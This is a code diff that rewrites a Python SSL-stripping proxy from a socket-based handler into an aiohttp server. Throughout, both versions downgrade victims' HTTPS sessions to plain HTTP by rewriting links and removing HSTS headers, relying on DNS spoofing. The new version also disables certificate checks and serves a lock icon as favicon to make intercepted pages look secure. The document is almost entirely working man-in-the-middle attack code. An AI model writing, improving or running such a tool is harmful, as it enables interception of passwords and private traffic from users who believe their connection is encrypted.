@@ -1,67 +1,92 @@
 #!/usr/bin/env python3
 
-import http.server
-import socketserver
-import random
-import string
-import socket
+import asyncio
+import aiohttp
+from aiohttp import web
 import ssl
-import urllib.parse
+import logging
+import os
+import sys
 
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+
+# Constants
 PORT = 80  # Must be run as root for port 80
+LOCK_ICON_PATH = "lock.ico"
 
+# Helper function to clean headers
+def clean_headers(headers):
+    headers_to_remove = ['accept-encoding', 'if-modified-since', 'cache-control']
+    return {k: v for k, v in headers.items() if k.lower() not in headers_to_remove}
 
-class SSLStripProxyHandler(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        # Target domain is assumed from Host header (DNS spoofed to us)
-        host = self.headers.get("Host")
-        if not host:
-            self.send_error(400, "No Host header provided.")
-            return
+# Helper function to get path to lock icon
+def get_path_to_lock_icon():
+    if os.path.exists(LOCK_ICON_PATH):
+        return LOCK_ICON_PATH
 
-        try:
-            # Connect to real server over HTTPS
-            context = ssl.create_default_context()
-            conn = context.wrap_socket(socket.create_connection((host, 443)), server_hostname=host)
+    script_path = os.path.abspath(os.path.dirname(sys.argv[0]))
+    script_path = os.path.join(script_path, "../share/sslstrip/lock.ico")
 
-            # Build GET request to real server
-            path = self.path or "/"
-            request_line = f"GET {path} HTTP/1.1\r\n"
-            headers = ''.join(f"{k}: {v}\r\n" for k, v in self.headers.items() if k.lower() not in ("host", "proxy-connection", "connection"))
-            full_request = request_line + f"Host: {host}\r\nConnection: close\r\n" + headers + "\r\n"
-            conn.sendall(full_request.encode())
+    if os.path.exists(script_path):
+        return script_path
 
-            # Read and modify HTTPS response
-            response = b""
-            while True:
-                chunk = conn.recv(4096)
-                if not chunk:
-                    break
-                response += chunk
-            conn.close()
+    logging.warning("Error: Could not find lock.ico")
+    return LOCK_ICON_PATH
 
-            # Strip HTTPS redirect and HSTS
-            response = response.replace(b"https://", b"http://")
-            response = response.replace(b"Strict-Transport-Security", b"X-Stripped-HSTS")
+# Handler for incoming HTTP requests
+async def handle_request(request):
+    host = request.headers.get('Host')
+    if not host:
+        return web.Response(status=400, text="No Host header provided.")
 
-            # Send back response over HTTP
-            self.wfile.write(response)
+    path = request.rel_url.path_qs or "/"
+    url = f"https://{host}{path}"
+    headers = clean_headers(request.headers)
 
-        except Exception as e:
-            self.send_error(502, f"Proxy error: {e}")
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.request(
+                method=request.method,
+                url=url,
+                headers=headers,
+                data=await request.read(),
+                allow_redirects=False,
+                ssl=False  # Disable SSL verification
+            ) as resp:
+                # Read and modify HTTPS response
+                body = await resp.read()
+                body = body.replace(b"https://", b"http://")
+                headers = dict(resp.headers)
+                headers = {k: v for k, v in headers.items() if k.lower() != 'strict-transport-security'}
+                headers['Connection'] = 'close'
 
-    def log_message(self, format, *args):
-        return  # Suppress logging
+                return web.Response(
+                    status=resp.status,
+                    headers=headers,
+                    body=body
+                )
+    except Exception as e:
+        logging.error(f"Proxy error: {e}")
+        return web.Response(status=502, text=f"Proxy error: {e}")
 
+# Handler for favicon.ico requests
+async def handle_favicon(request):
+    try:
+        with open(get_path_to_lock_icon(), 'rb') as f:
+            icon_data = f.read()
+        return web.Response(body=icon_data, content_type='image/x-icon')
+    except Exception as e:
+        logging.error(f"Error serving favicon: {e}")
+        return web.Response(status=404, text="Favicon not found.")
 
+# Main function to start the server
 def main():
-    with socketserver.TCPServer(("", PORT), SSLStripProxyHandler) as httpd:
-        print(f"SSL stripping proxy running at http://0.0.0.0:{PORT}/")
-        try:
-            httpd.serve_forever()
-        except KeyboardInterrupt:
-            print("\nShutting down…")
+    app = web.Application()
+    app.router.add_route('*', '/favicon.ico', handle_favicon)
+    app.router.add_route('*', '/{tail:.*}', handle_request)
 
+    web.run_app(app, host='0.0.0.0', port=PORT)
 
 if __name__ == "__main__":
     main()
